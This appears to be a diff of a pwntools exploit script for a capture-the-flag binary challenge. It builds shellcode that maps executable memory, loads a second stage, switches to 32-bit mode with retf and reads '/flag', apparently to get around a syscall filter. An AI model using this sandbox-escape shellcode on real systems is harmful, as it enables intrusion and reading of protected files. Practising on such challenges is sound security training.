@@ -1,7 +1,7 @@
 from pwn import *
 
-p = process("./chal2")
-context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+p = process("./chal4")
+# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 # You can check all Linux x64 syscalls at this page: https://syscalls64.paolostivanin.com/
 # For this challenge, your task is removing redundant shellcodes and make it less than 0x10 bytes
 # Tip 1: Some register have the correct values before running our shellcode! Let's use gdb to check the registers!
@@ -10,15 +10,54 @@ context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
 # so we could read longer shellcode to execute "/bin/sh" ?
 context.arch = 'amd64'
 shellcode = f'''
-mov rdx,0x100
+xor rax,rax
+mov al,0x9
+mov rdi,0xcafe0000
+mov rsi,0x100
+mov rdx,0x7
+mov r10,0x21
+xor r8,r8
+xor r9,r9
 syscall
+
+xor rdi,rdi
+mov rsi,rax
+xor rdx,rdx
+mov dl,0xff
+xor rax,rax
+syscall
+
+mov rax,0x2300000000
+xor rsi,rax
+push rsi
+retf
 '''
-# gdb.attach(p)
+gdb.attach(p)
 shellcode = asm(shellcode)
-print(len(shellcode))
-assert(len(shellcode)<=0x10)
-p.send(shellcode.ljust(0x10,b'\0'))
-# If you sent proper shellcode which allow us to read longer shellcode, 
-# you can try the following code it's a more beatiful way to generate shellcode
-p.send(b"\x90"*len(shellcode)+asm(shellcraft.sh()))
+p.send(shellcode.ljust(0x100,b'\0'))
+
+context.arch='i386'
+context.bits=32
+flag_path_1 = hex(u32(b"/fla"))
+flag_path_2 = hex(u32(b"g\0\0\0"))
+shellcode=f'''
+mov esp, 0xcafe0800
+xor eax,eax
+mov al,0x5
+push {flag_path_2}
+push {flag_path_1}
+mov ebx,esp
+xor ecx,ecx
+xor edx,edx
+int 0x80
+mov ebx,eax
+mov al,0x3
+mov ecx,esp
+mov dl,0xff
+int 0x80
+mov al,0x4
+mov bl,0x1
+int 0x80
+'''
+p.send(asm(shellcode))
 p.interactive()
